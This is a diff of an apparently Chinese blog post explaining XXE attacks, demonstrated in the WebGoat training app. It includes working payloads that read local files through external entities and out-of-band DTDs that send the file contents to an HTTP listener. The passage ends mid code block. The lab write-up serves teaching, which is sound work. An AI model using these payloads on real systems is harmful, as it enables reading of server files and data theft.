@@ -428,7 +428,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-10-08
+                    2021-10-06
                 </div>
                 
 
@@ -442,14 +442,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    5.7k
+                    5.5k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    24 分
+                    23 分
                 </div>
                 
 
@@ -468,200 +468,200 @@
 <h2 id="0x01-XML外部实体攻击-XXE"><a href="#0x01-XML外部实体攻击-XXE" class="headerlink" title="0x01 XML外部实体攻击(XXE)"></a>0x01 XML外部实体攻击(XXE)</h2><blockquote>
 <p>XML 外部实体攻击(XXE)是针对解析 XML 输入的应用程序的一种攻击。当包含对外部实体的引用的 XML 输入被弱配置的 XML 解析器处理时，就会发生这种攻击。这种攻击可能导致机密数据泄露、拒绝服务、服务器端请求伪造、从解析器所在机器的角度进行端口扫描等系统影响。</p>
 </blockquote>
-<h3 id="XML的格式"><a href="#XML的格式" class="headerlink" title="XML的格式"></a>XML的格式</h3><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?&gt;</span>
+<h3 id="XML的格式"><a href="#XML的格式" class="headerlink" title="XML的格式"></a>XML的格式</h3><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>
 <span class="token doctype">&lt;!DOCTYPE note [
-  &lt;!ELEMENT note (to,from,heading,body)&gt;</span>
-  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">to</span>      <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">&gt;</span></span>
-  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">from</span>    <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">&gt;</span></span>
-  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">heading</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">&gt;</span></span>
-  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">body</span>    <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">&gt;</span></span>
-]&gt;
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">&gt;</span></span>
-  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">&gt;</span></span>George<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">&gt;</span></span>
-  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">&gt;</span></span>John<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">&gt;</span></span>
-  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">&gt;</span></span>Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">&gt;</span></span>
-  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>Don't forget the meeting!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+  &lt;!ELEMENT note (to,from,heading,body)></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">to</span>      <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">from</span>    <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">heading</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">body</span>    <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>
+]>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>George<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>John<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">></span></span>Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>Don't forget the meeting!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2021/08/05/63rbgyjlxPaFUOD.png"></p>
 <h3 id="文档类型定义（DTD）"><a href="#文档类型定义（DTD）" class="headerlink" title="文档类型定义（DTD）"></a>文档类型定义（DTD）</h3><p>了解XML实体之前先熟悉下DTD，DTD 文件是一种特殊类型的 XML 文件，其中包含有关 XML 格式或结构的信息。它们用于在不同的、单独的 XML 文件之间建立一致性。这些 DTD 文件可以包含一个称为 ENTITY 的元素，DTD可以在XML内部也可以单独存在DTD文件中。XML实体在 DTD 中创建，实体可以利用协议进行系统调用。 内部的DOCTYPE声明：</p>
 <pre class="line-numbers language-xml"><code class="language-xml"><span class="token doctype">&lt;!DOCTYPE note [
-  &lt;!ELEMENT note (to)&gt;</span>
-  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">to</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">&gt;</span></span>
-  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">to</span> <span class="token attr-name">"123"</span><span class="token punctuation">&gt;</span></span>
-]&gt;
+  &lt;!ELEMENT note (to)></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">to</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">to</span> <span class="token attr-name">"123"</span><span class="token punctuation">></span></span>
+]>
 
 !DOCTYPE note     定义文档的类型是note;
 !ELEMENT note     定义note里的元素；
 !ELEMENT to         定义元素to的数据类型是#PCDATA，也可以用ANY;
 !ENTITY to             定义元素to的值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>外部的DOCTYPE声明：</p>
-<pre class="line-numbers language-xml"><code class="language-xml"><span class="token doctype">&lt;!DOCTYPE note SYSTEM "http://x.x.x.x/note.dtd"&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token doctype">&lt;!DOCTYPE note SYSTEM "http://x.x.x.x/note.dtd"></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>独立的DTD文件,为XML中的DTD部分，直接保存为单独的.dtd文件：</p>
-<pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">note</span> <span class="token attr-name">(to)</span><span class="token punctuation">&gt;</span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">to</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">&gt;</span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">to</span> <span class="token attr-name">"123"</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">note</span> <span class="token attr-name">(to)</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">to</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">to</span> <span class="token attr-name">"123"</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h3 id="XML实体类型"><a href="#XML实体类型" class="headerlink" title="XML实体类型"></a>XML实体类型</h3><p>实体是对数据引用，须在DTD中定义。XML中引用实体的方式是<code>&amp;实体名称;</code>，一般来说需要了解的有下面几种类型：</p>
 <h4 id="字符实体"><a href="#字符实体" class="headerlink" title="字符实体"></a>字符实体</h4><p>指用十进制格式<code>&amp;#37;</code>或十六进制格式<code>&amp;#x25;</code>来指定任意 Unicode 字符。对 XML 解析器而言，字符实体与直接输入指定字符的效果完全相同。<code>&amp;#37; = &amp;#x25; = %</code>，在a中的值使用字符实体转码%定义参数实体b：</p>
 <pre class="line-numbers language-xml"><code class="language-xml"><span class="token doctype">&lt;!DOCTYPE xxe [
-&lt;!ENTITY % a "&lt;!ENTITY &amp;#x25; b SYSTEM 'http://127.0.0.1:8090/ewq'&gt;</span>"&gt;
-%a;%b;]&gt;
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">/&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+&lt;!ENTITY % a "&lt;!ENTITY &amp;#x25; b SYSTEM 'http://127.0.0.1:8090/ewq'></span>">
+%a;%b;]>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <h4 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h4><p>指ENTITY没有关键字<code>SYSTEM</code>，<code>PUBLIC</code>的实体，如下XML:</p>
-<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" ?&gt;</span>
-<span class="token doctype">&lt;!DOCTYPE note [  &lt;!ELEMENT note (to)&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">to</span> <span class="token attr-name">"123"</span><span class="token punctuation">&gt;</span></span>]&gt;
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">&gt;</span></span><span class="token entity" title="&amp;to;">&amp;to;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" ?></span>
+<span class="token doctype">&lt;!DOCTYPE note [  &lt;!ELEMENT note (to)></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">to</span> <span class="token attr-name">"123"</span><span class="token punctuation">></span></span>]>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token entity" title="&to;">&amp;to;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h4 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h4><p>ENTITY中关键字为SYSTEM, PUBLIC “id”格式，具体值是链接指向的文件内容，相当于一个包含效果，将远程的内容用一个内部实体存放到内部dtd中 ：</p>
-<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" ?&gt;</span>
-<span class="token doctype">&lt;!DOCTYPE a [&lt;!ENTITY e SYSTEM "file:///1.txt"&gt;</span>]&gt;
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">&gt;</span></span><span class="token entity" title="&amp;e;">&amp;e;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">&gt;</span></span>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" ?></span>
+<span class="token doctype">&lt;!DOCTYPE a [&lt;!ENTITY e SYSTEM "file:///1.txt"></span>]>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">></span></span><span class="token entity" title="&e;">&amp;e;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">></span></span>
 &amp;
-<span class="token prolog">&lt;?xml version="1.0" ?&gt;</span>
-<span class="token doctype">&lt;!DOCTYPE a [&lt;!ENTITY e PUBLIC "2" "file:///1.txt"&gt;</span>]&gt;
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">&gt;</span></span><span class="token entity" title="&amp;e;">&amp;e;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token prolog">&lt;?xml version="1.0" ?></span>
+<span class="token doctype">&lt;!DOCTYPE a [&lt;!ENTITY e PUBLIC "2" "file:///1.txt"></span>]>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">></span></span><span class="token entity" title="&e;">&amp;e;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h4 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h4><p>参数实体在dtd文件中或xml的dtd区中定义，定义格式为 <code>&lt;!ENTITY % 实体名称 "实体的值"&gt;</code>，引用格式使用%：<code>%实体名称</code>：</p>
-<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" ?&gt;</span>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" ?></span>
 <span class="token doctype">&lt;!DOCTYPE xxe [
-&lt;!ENTITY % a SYSTEM "file:///1.txt"&gt;</span>
-%a;]&gt;
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">/&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+&lt;!ENTITY % a SYSTEM "file:///1.txt"></span>
+%a;]>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>参数实体的引用需要注意下面几点：<br>1.在参数实体中可以引用其他参数实体，但这种引用只能出现在外部DTD子集声明中；<br>2.参数实体可以定义新的实体；<br>3.参数实体解析优先级高于其他实体。<br>为了理解参数实体的利用方式，在Webgoat中XXE例子中进行详细测试，如下位置，想通过param3引用data的值:</p>
-<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?&gt;</span>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>
 <span class="token doctype">&lt;!DOCTYPE r [
-&lt;!ENTITY % data SYSTEM "file:///c://2.txt"&gt;</span>
-&lt;!ENTITY % param3 "http://127.0.0.1:8090/txt=%data;"&gt;
+&lt;!ENTITY % data SYSTEM "file:///c://2.txt"></span>
+&lt;!ENTITY % param3 "http://127.0.0.1:8090/txt=%data;">
 %param3;
-]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+]><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>发送后出现了错误“参数实体引用 “%data;” 不能出现在 DTD 的内部子集中的标记内”：<br><img src="https://i.loli.net/2021/08/06/TCPgAf75lFbKJ24.png"><br>所以在外部DTD中用参数实体引用其他参数实体：<br><img src="https://i.loli.net/2021/08/06/vc1SYszAPWJHRq7.png"><br>这里发现%data并没有被替换成文件内容发送到http服务器上，这里注意到使用的是SYSTEM关键字，后面的会直接被当成外部的链接了。所以这里既要把读取文件内容的参数实体解析进去又要对外发起请求，就需要有两次实体的引用，一次是将文件内容解析到字符串中，一次是引用外部实体时将数据带出，参数实体很好的具备了这些特性，可以从字符串中定义新的实体，并在dtd中进行引用完成多次的内容替换，所以构造外部dtd文件为：</p>
-<pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % p "&lt;!ENTITY <span class="token entity" title="%">&amp;#x25;</span> exfil SYSTEM 'http://127.0.0.1:8090/?id=%data;'&gt;"&gt; %p;%exfil;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % p "&lt;!ENTITY <span class="token entity" title="&#x25;">&amp;#x25;</span> exfil SYSTEM 'http://127.0.0.1:8090/?id=%data;'>"> %p;%exfil;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>在 <code>%p;</code> 解析中 <code>&amp;#x25;</code> 解析为%，<code>%data</code>解析为文件内容 ，内部表现为如下xml，这样再次解析exfil等于一个外部实体引用就可以发起外部DTD的请求了：</p>
-<pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % exfil SYSTEM 'http://127.0.0.1:8090/?id=文件内容'&gt; %exfil;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % exfil SYSTEM 'http://127.0.0.1:8090/?id=文件内容'> %exfil;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>如果这里使用普通实体来定义新的实体，会直接因为字符 <code>&lt;</code>  抛出异常<code>元素内容必须由格式正确的字符数据或标记组成。</code>：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/ee697d143246710d19437603ec30dcaa.png"><br>所以需要用参数实体来定义新的外部实体。POC发起后，成功在web监听上获取到了文件内容：<br><img src="https://i.loli.net/2021/08/06/ohklO9aS31JQvXG.png"><br>这里注意到响应中抛出了Unicode编码的异常:</p>
 <pre class="line-numbers language-tex"><code class="language-tex">\u6587\u6863\u7C7B\u578B\u58F0\u660E\u5305\u542B\u6216\u6307\u5411\u7684\u6807\u8BB0\u58F0\u660E\u5FC5\u987B\u683C\u5F0F\u6B63\u786E\u3002 
 
 转换过来就是：文档类型声明包含或指向的标记声明必须格式正确。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>是因为引用外部的实体不是正确的dtd格式，将服务器返回一个正常的dtd格式，那么就正常了,POC:：</p>
-<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?&gt;</span>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>
 <span class="token doctype">&lt;!DOCTYPE root [
-&lt;!ENTITY % data SYSTEM "file:///c://2.txt"&gt;</span>
-&lt;!ENTITY % param3 SYSTEM "http://127.0.0.1:8090/note.dtd"&gt;
+&lt;!ENTITY % data SYSTEM "file:///c://2.txt"></span>
+&lt;!ENTITY % param3 SYSTEM "http://127.0.0.1:8090/note.dtd">
 %param3;
-]&gt;
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">&gt;</span></span>777<span class="token entity" title="&amp;text;">&amp;text;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+]>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">></span></span>777<span class="token entity" title="&text;">&amp;text;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>note.dtd:</p>
-<pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % p "&lt;!ENTITY % send SYSTEM 'http://127.0.0.1:8090/2.dtd?text=%data;'&gt;"&gt; %p;%send;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % p "&lt;!ENTITY % send SYSTEM 'http://127.0.0.1:8090/2.dtd?text=%data;'>"> %p;%send;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>2.dtd：</p>
-<pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">text</span> <span class="token attr-name">"Hi!!"</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">text</span> <span class="token attr-name">"Hi!!"</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2021/08/06/BcnVLmdYQWx1pKz.png"><br>理解了参数实体部分，后续构造XXE Payload就比较容易了。</p>
 <h3 id="XXE类型"><a href="#XXE类型" class="headerlink" title="XXE类型"></a>XXE类型</h3><p>一般来说，可以分为以下类型的 XXE 攻击：<br>XXE回显注入(Classic XXE)        — 一般的XXE,响应直接或间接返回资源内容<br>XXE盲注(Bind XXE) — 响应中不显示输出或错误<br>XXE报错注入(Error XXE) — 资源的内容在错误信息中返回<br>XXE DOS — 利用多重实体嵌套解析消耗服务器内存</p>
 <p>在Webgoat中对几种注入进行测试。</p>
 <h4 id="XXE回显注入"><a href="#XXE回显注入" class="headerlink" title="XXE回显注入"></a>XXE回显注入</h4><p>先传入正常值可在评论列表获得回显信息:<br><img src="https://i.loli.net/2021/08/05/crvYTpLPI1uKA7h.png"><br>测试实体引用，使用DTD定义实体，发送数据后，观察到内容在评论出回显，说明可以引用实体：</p>
-<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?&gt;</span>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>
 <span class="token doctype">&lt;!DOCTYPE a [
-&lt;!ENTITY b "666666666666666666666666666666666666666666666666666666666666666666"&gt;</span>
-]&gt;
- <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">&gt;</span></span><span class="token entity" title="&amp;b;">&amp;b;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+&lt;!ENTITY b "666666666666666666666666666666666666666666666666666666666666666666"></span>
+]>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">></span></span><span class="token entity" title="&b;">&amp;b;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/8cd3b4817c903cd19ad1c796df11db22.png"><br>再测试外部实体的引用，尝试使用HTTP协议引用外部DTD文件:</p>
-<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?&gt;</span>
-<span class="token doctype">&lt;!DOCTYPE a SYSTEM "http://127.0.0.1:8090/note.dtd"&gt;</span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">&gt;</span></span><span class="token entity" title="&amp;b;">&amp;b;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>
+<span class="token doctype">&lt;!DOCTYPE a SYSTEM "http://127.0.0.1:8090/note.dtd"></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">></span></span><span class="token entity" title="&b;">&amp;b;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>外部dtd为note.dtd,内容如下，定义了一个普通实体b，值为 this is dtd:</p>
-<pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">b</span> <span class="token attr-name">"this</span> <span class="token attr-name">is</span> <span class="token attr-name">dtd"</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">b</span> <span class="token attr-name">"this</span> <span class="token attr-name">is</span> <span class="token attr-name">dtd"</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>观察到评论区回显了远程DTD文件中定义的实体值：<br><img src="https://i.loli.net/2021/08/05/vsgxY1NbPHZwoS3.png"><br>修改POC，测试使用参数实体引用外部DTD:</p>
-<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?&gt;</span>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>
 <span class="token doctype">&lt;!DOCTYPE a [
